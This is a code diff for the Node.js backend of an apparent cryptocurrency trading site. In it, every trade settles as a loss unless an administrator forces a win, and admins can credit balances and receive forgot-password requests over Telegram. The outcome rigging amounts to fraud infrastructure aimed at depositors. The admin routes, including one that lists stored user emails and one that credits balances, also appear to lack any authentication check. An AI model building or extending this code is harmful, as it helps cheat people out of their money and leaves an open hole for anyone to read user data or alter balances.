@@ -182,6 +182,13 @@ const initializeDatabase = async () => {
           status TEXT DEFAULT 'pending',
           created_at TIMESTAMPTZ DEFAULT NOW()
         );
+
+        CREATE TABLE IF NOT EXISTS forgot_passwords (
+          id SERIAL PRIMARY KEY,
+          email TEXT,
+          status TEXT DEFAULT 'pending',
+          created_at TIMESTAMPTZ DEFAULT NOW()
+        );
       `);
 
       // Migration: Add missing columns if they don't exist
@@ -235,10 +242,9 @@ const initializeDatabase = async () => {
             // User Requirement: DEFAULT to loss unless admin explicitly sets 'win'
             const isWin = trade.force_outcome === 'win';
 
-            const leverageFactor = (parseFloat(trade.leverage || 10)) / 10;
             const amount = parseFloat(trade.amount || 0);
-            const payoutRate = 0.85;
-            const payout = isWin ? amount * (1 + (payoutRate * leverageFactor)) : 0;
+            const leverage = parseFloat(trade.leverage || 20);
+            const payout = isWin ? amount * (1 + (leverage / 100)) : 0;
             
             const finalStatus = isWin ? 'won' : 'lost';
             
@@ -775,6 +781,31 @@ app.post('/api/send-email', async (req, res) => {
   }
 });
 
+app.post('/api/auth/forgot-password', async (req, res) => {
+  const { email } = req.body;
+  if (!email) return res.status(400).json({ error: 'Email required' });
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+
+  try {
+    const userEmail = email.toLowerCase().trim();
+    await pool.query('INSERT INTO forgot_passwords (email) VALUES ($1)', [userEmail]);
+    await sendTelegramNotification(`<b>🔑 Forgot Password Request</b>\n\n<b>Email:</b> ${userEmail}`);
+    res.json({ success: true, message: 'Request sent to admin' });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.get('/api/admin/forgot-passwords', async (req, res) => {
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    const r = await pool.query('SELECT * FROM forgot_passwords ORDER BY created_at DESC');
+    res.json(r.rows);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
 app.post('/api/auth/signup-request', async (req, res) => {
   const { email, password, name } = req.body;
   if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
@@ -977,16 +1008,17 @@ app.post('/api/admin/force-outcome', async (req, res) => {
 });
 
 app.post('/api/admin/credit-balance', async (req, res) => {
-  const { walletAddress, currency, amount } = req.body;
+  const { walletAddress, currency, amount, target } = req.body;
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
     const amt = parseFloat(amount);
     if (isNaN(amt) || amt === 0) return res.status(400).json({ error: 'Invalid amount' });
 
     if (currency.toUpperCase() === 'USDT') {
+      const field = target === 'trade' ? 'trading_balance' : 'protocol_settlement_balance';
       await pool.query(`
           UPDATE users SET 
-            protocol_settlement_balance = (protocol_settlement_balance::numeric + $1)::text 
+            ${field} = (${field}::numeric + $1)::text 
           WHERE wallet_address = $2
       `, [amt, walletAddress]);
     }
@@ -996,7 +1028,7 @@ app.post('/api/admin/credit-balance', async (req, res) => {
       asset_symbol: currency.toUpperCase(),
       amount: amt,
       type: 'deposit',
-      reference: 'admin_credit',
+      reference: `admin_credit_${target || 'spot'}`,
       status: 'completed'
     });
 
@@ -1377,7 +1409,12 @@ app.get('/api/user/active-trades', async (req, res) => {
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
   try {
     const r = await pool.query('SELECT * FROM trades WHERE wallet_address = $1 AND status = \'pending\' ORDER BY created_at DESC', [address]);
-    res.json(r.rows);
+    const mapped = r.rows.map(t => ({
+      ...t,
+      forceOutcome: t.force_outcome,
+      startTime: new Date(t.created_at).getTime()
+    }));
+    res.json(mapped);
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
@@ -1419,8 +1456,8 @@ app.post('/api/settle-trade', async (req, res) => {
     const isWin = trade.force_outcome === 'win';
 
     const finalStatus = isWin ? 'won' : 'lost';
-    const leverageFactor = (parseFloat(trade.leverage) || 10) / 10;
-    const finalPayout = isWin ? parseFloat(trade.amount) * (1 + (0.85 * leverageFactor)) : 0;
+    const leverage = parseFloat(trade.leverage || 20);
+    const finalPayout = isWin ? parseFloat(trade.amount) * (1 + (leverage / 100)) : 0;
     
     await pool.query('UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2', [finalStatus, tradeRef]);
 
